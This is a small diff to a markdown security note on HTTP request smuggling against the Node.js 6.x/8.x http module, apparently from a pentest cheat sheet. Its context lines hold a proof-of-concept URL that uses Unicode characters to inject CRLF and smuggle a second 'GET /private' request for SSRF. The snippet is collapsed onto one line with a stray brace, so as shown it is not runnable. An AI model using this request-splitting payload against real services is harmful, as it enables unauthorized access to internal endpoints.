@@ -1,6 +1,6 @@
 # HTTP request smuggling
 ## Node 6.x and 8.x
-[Node.js `http` module](https://translate.google.com/website?sl=auto&tl=en&hl=ar&u=https://github.com/nodejs/node/issues/13296) is vulnerable to this attack and can be abused to trigger an SSRF attack.
+[Node.js http module](https://translate.google.com/website?sl=auto&tl=en&hl=ar&u=https://github.com/nodejs/node/issues/13296) is vulnerable to this attack and can be abused to trigger an SSRF attack.
 - Vulnerable code
 ```js
 const http = require('http') const server = http.createServer((req, res) => { console.log(req.url); res.end(); }); server.listen(8000, function() { http.get('http://127.0.0.1:8000/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private', function() { }); });
